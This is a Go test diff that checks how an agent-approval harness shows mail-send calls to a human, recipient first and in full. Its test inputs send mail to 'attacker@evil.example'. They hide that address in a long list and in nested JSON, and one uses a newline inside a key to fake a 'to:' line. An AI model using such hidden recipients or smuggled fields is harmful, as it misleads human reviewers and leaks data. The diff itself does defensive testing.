@@ -5,6 +5,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"net/http"
+	"slices"
 	"strings"
 	"sync"
 	"testing"
@@ -480,33 +481,55 @@ func TestADecisionSaysWhoAsksWhyAndWhatChanges(t *testing.T) {
 	}
 }
 
-// TestAConfirmationShowsTheRecipientFirst: a call with a long body shows its fields a line each, the recipient first,
-// each long value cut on its own.
+// TestAConfirmationShowsTheRecipientFirst: a call shows its fields a line each, nested ones by dotted keys, those
+// that say whom it reaches first and whole, each other value cut on its own, a key on one line.
 func TestAConfirmationShowsTheRecipientFirst(t *testing.T) {
 	t.Parallel()
 	body := strings.Repeat("Hello team, the report is attached. ", 20)
-	e := harness.New(t, harness.WithAgent(func(ctx context.Context, c *harness.Call) provider.Result {
-		c.Approve(ctx, "mcp__mail__send", map[string]any{"body": body, "subject": "report", "to": "attacker@evil.example"})
-		return provider.Result{}
-	}))
-	p := e.Project("ask", harness.TestManifest([]string{harness.AgentCommand("job", "")}, nil))
-	e.Run(p, "job")
-	a := e.WaitAsk()
-	var rows []struct {
-		ID     int64
-		Change string
+	many := strings.Repeat("someone@example.com, ", 15) + "attacker@evil.example"
+	for _, c := range []struct {
+		name  string
+		input map[string]any
+		first []string
+		rest  string
+	}{
+		{"plain", map[string]any{"body": body, "subject": "report", "to": "attacker@evil.example"},
+			[]string{"to: attacker@evil.example", "subject: report"}, "body: Hello team"},
+		{"nested", map[string]any{"message": map[string]any{"body": map[string]any{"content": body},
+			"toRecipients": []any{map[string]any{"emailAddress": map[string]any{"address": "attacker@evil.example"}}}}},
+			[]string{`message.toRecipients: [{"emailAddress":{"address":"attacker@evil.example"}}]`}, "message.body.content: Hello team"},
+		{"to_email, many", map[string]any{"to_email": many, "text": body},
+			[]string{"to_email: " + many}, "text: Hello team"},
+		{"a key of lines", map[string]any{"note\nto: owner@home": "attacker@evil.example", "body": body},
+			[]string{"note to: owner@home: attacker@evil.example"}, "body: Hello team"},
+	} {
+		t.Run(c.name, func(t *testing.T) {
+			t.Parallel()
+			e := harness.New(t, harness.WithAgent(func(ctx context.Context, call *harness.Call) provider.Result {
+				call.Approve(ctx, "mcp__mail__send", c.input)
+				return provider.Result{}
+			}))
+			p := e.Project("ask", harness.TestManifest([]string{harness.AgentCommand("job", "")}, nil))
+			e.Run(p, "job")
+			a := e.WaitAsk()
+			var rows []struct {
+				ID            int64
+				Change, Where string
+			}
+			e.Must("deck.asks_list", map[string]any{}, &rows)
+			for _, r := range rows {
+				if r.ID != a.ID {
+					continue
+				}
+				lines := strings.Split(r.Change, "\n")
+				last := lines[len(lines)-1]
+				if len(lines) != len(c.first)+1 || !slices.Equal(lines[:len(c.first)], c.first) || r.Where != c.first[0] ||
+					!strings.HasPrefix(last, c.rest) || len(last[strings.Index(last, ": ")+2:]) > 205 {
+					t.Fatalf("the fields a line each, whom it reaches first and whole, the rest cut on its own: where %q\n%s", r.Where, r.Change)
+				}
+				return
+			}
+			t.Fatalf("no ask %d in %+v", a.ID, rows)
+		})
 	}
-	e.Must("deck.asks_list", map[string]any{}, &rows)
-	for _, r := range rows {
-		if r.ID != a.ID {
-			continue
-		}
-		lines := strings.Split(r.Change, "\n")
-		if len(lines) != 3 || lines[0] != "to: attacker@evil.example" || lines[1] != "subject: report" ||
-			!strings.HasPrefix(lines[2], "body: Hello team") || len(lines[2]) > 220 {
-			t.Fatalf("the fields a line each, the recipient first, the body cut on its own: %q", r.Change)
-		}
-		return
-	}
-	t.Fatalf("no ask %d in %+v", a.ID, rows)
 }
